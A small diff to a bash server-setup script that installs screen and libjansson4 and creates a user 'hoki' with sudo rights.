@@ -1,7 +1,7 @@
 #!/bin/bash
 apt update
 apt install sudo
-apt install screen -y
+sudo apt install screen libjansson4 -y
 sudo useradd -m hoki
 sudo adduser hoki sudo
 sudo usermod -a -G sudo hoki
